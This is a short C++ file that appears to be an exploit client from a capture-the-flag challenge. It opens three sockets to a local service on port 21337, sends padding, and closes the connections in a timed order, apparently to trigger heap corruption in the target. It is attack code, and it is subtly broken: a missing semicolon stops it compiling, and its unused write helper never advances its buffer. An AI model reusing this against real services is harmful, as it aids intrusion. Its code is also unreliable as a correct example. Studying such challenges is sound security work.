//g++ 1.c -o main -z noexecstack -fstack-protector-all -pie -z now
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/shm.h>
#include <malloc.h>
#define MYPORT  21337
#define BUFFER_SIZE 128

int connect_with()
{
	
    int fd = socket(AF_INET,SOCK_STREAM, 0);
    if(fd < 0){
    	perror("socket");
    }
    struct sockaddr_in Socket;
    Socket.sin_family = AF_INET;
    Socket.sin_port = htons(MYPORT);
    Socket.sin_addr.s_addr = inet_addr("127.0.0.1");
 
  if (connect(fd, reinterpret_cast<const sockaddr*>(&Socket), sizeof(Socket)) != 0) {
    perror("connect");
  }
    return fd;
}


void writeall(int fd, char *buf, size_t len) {
    size_t towrite = len;
    while (towrite) {
        ssize_t written = write(fd, buf, towrite);
        if (written <= 0) {
            puts("write failure");
            exit(0);
        }
        towrite -= written;
    }
}

void readall(int fd, char *buf, size_t len) {
    size_t toread = len;
    while (toread) {
        ssize_t readden = read(fd, buf, toread);
        if (readden <= 0) {
            puts("read failure");
            exit(0);
        }
        toread -= readden;
    }
}

int main()
{
	char pad[] = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\n";
	int fds[0x10];
	memset(fds,0,0x10*sizeof(int));
	void *buf = malloc(0x10000);
	int i;
	for(i = 0; i < 3 ; i++)
	{
		fds[i] = connect_with();
		write(fds[i],pad,0x20);
		usleep(1000);
	}
	
	close(fds[0])
	usleep(1000);
	write(fds[2],"FMYY",4);
	close(fds[1]);
	usleep(1000);
	getchar();
}
